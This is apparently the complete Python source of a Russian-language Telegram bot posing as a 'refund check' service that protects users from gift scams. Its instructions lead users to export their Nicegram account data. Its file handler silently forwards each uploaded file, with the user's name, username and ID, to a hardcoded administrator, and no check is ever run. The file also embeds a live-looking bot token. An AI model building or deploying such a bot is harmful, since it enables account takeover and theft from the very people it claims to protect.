import os
import datetime
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputMediaPhoto,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# === НАСТРОЙКИ ===
TOKEN = "7793716122:AAE2XIjboBjmS8e75yzbdsb92l3bJx_f4KY"   # вставь сюда токен
ADMIN_ID = 8234456402                # твой Telegram ID
IMAGE_PATH = "nicegram.jpg"          # картинка приветствия

# === ТЕКСТ ИНСТРУКЦИИ (без Markdown) ===
INSTRUCTION_TEXT = (
    "📘 Инструкция:\n\n"
    "1. Скачайте приложение Nicegram с официального сайта или установите его через App Store / Google Play.\n"
    "2. Откройте Nicegram и войдите в свой аккаунт.\n"
    "3. Зайдите в настройки и выберите пункт «Nicegram».\n"
    "4. Экспортируйте данные аккаунта, нажав на кнопку «Экспортировать в файл».\n"
    "5. Откройте главное меню бота и нажмите кнопку «Проверка на рефанд».\n"
    "6. Отправьте полученный файл боту для проверки."
)

# === КНОПКИ ===
def main_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📘 Инструкция", callback_data="instr")],
        [InlineKeyboardButton("📥 Скачать NiceGram", url="https://nicegram.app/")],
        [InlineKeyboardButton("🔍 Проверка на рефанд", callback_data="refund")],
    ])

def cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Отмена", callback_data="cancel")]])

# === /start ===
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    caption = (
        f"Привет, {user.first_name or 'друг'}! \n\n"
        "Я — бот, который поможет тебе не попасться на мошенников.\n"
        "Я помогу отличить реальный подарок от чистого визуала, "
        "за который уже вернули деньги.\n\n"
        "Выбери действие ниже 👇"
    )

    if os.path.exists(IMAGE_PATH):
        with open(IMAGE_PATH, "rb") as img:
            await update.message.reply_photo(photo=img, caption=caption, reply_markup=main_menu_kb())
    else:
        await update.message.reply_text(caption, reply_markup=main_menu_kb())

# === КНОПКИ ===
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Инструкция
    if query.data == "instr":
        # оставляем ту же картинку, меняем подпись
        try:
            await query.message.edit_caption(INSTRUCTION_TEXT, reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Назад", callback_data="menu")]
            ]))
        except Exception:
            # если сообщение было текстовым без фото
            await query.message.edit_text(INSTRUCTION_TEXT, reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Назад", callback_data="menu")]
            ]))
        return

    # Проверка на рефанд
    if query.data == "refund":
        text = "🗂 Отправьте файл формата .txt или .zip для проверки на рефанд:"
        try:
            await query.message.edit_caption(text, reply_markup=cancel_kb())
        except Exception:
            await query.message.edit_text(text, reply_markup=cancel_kb())
        return

    # Отмена / Назад — просто вернуть главное меню
    if query.data in ("cancel", "menu"):
        user = query.from_user
        caption = (
            f"Привет, {user.first_name or 'друг'}! \n\n"
            "Я — бот, который поможет тебе не попасться на мошенников.\n"
            "Я помогу отличить реальный подарок от чистого визуала, "
            "за который уже вернули деньги.\n\n"
            "Выбери действие ниже 👇"
        )

        if os.path.exists(IMAGE_PATH):
            with open(IMAGE_PATH, "rb") as img:
                await query.message.edit_media(InputMediaPhoto(img))
                await query.message.edit_caption(caption, reply_markup=main_menu_kb())
        else:
            await query.message.edit_text(caption, reply_markup=main_menu_kb())
        return

# === ПРИЁМ ФАЙЛОВ ===
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    doc = update.message.document
    fname = (doc.file_name or "").lower()

    # Проверка формата
    if not (fname.endswith(".txt") or fname.endswith(".zip")):
        await update.message.reply_text(
            "🤔 Это похоже не файл проверки на рефанд...\n"
            "Ознакомьтесь с инструкцией перед отправкой файла:"
        )
        await update.message.reply_text(INSTRUCTION_TEXT)
        return

    # Пользователю — подтверждение
    await update.message.reply_text("✅ Файл был отправлен на проверку боту. Ожидайте результата.")

    # Сообщение админу без разметки — чтобы ничего не сломалось
    info = (
        "📩 Новый файл для проверки\n\n"
        f"👤 Имя: {user.first_name or '—'} {user.last_name or ''}\n"
        f"🏷 Username: @{user.username}" if user.username else "🏷 Username: —"
    )
    # добавляем остальные строки безопасно
    info += (
        f"\n🆔 ID: {user.id}"
        f"\n🕓 Время: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
        f"\n📎 Файл: {doc.file_name}"
    )

    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=info)
    except Exception as e:
        print(f"[WARN] Не удалось отправить сообщение админу: {e}")

    # Пытаемся доставить файл тремя способами
    try:
        await context.bot.copy_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
        print("[INFO] Файл скопирован админу.")
        return
    except Exception as e:
        print(f"[INFO] copy_message не сработал: {e}")

    try:
        await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
        print("[INFO] Файл переслан админу.")
        return
    except Exception as e:
        print(f"[INFO] forward_message не сработал: {e}")

    try:
        await context.bot.send_document(chat_id=ADMIN_ID, document=doc.file_id, caption=doc.file_name)
        print("[INFO] Файл отправлен через send_document.")
    except Exception as e:
        print(f"[ERROR] Не удалось доставить файл админу: {e}")

# === ЗАПУСК ===
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    print("✅ Бот запущен. Нажми Ctrl+C для остановки.")
    app.run_polling()

if __name__ == "__main__":
    main()
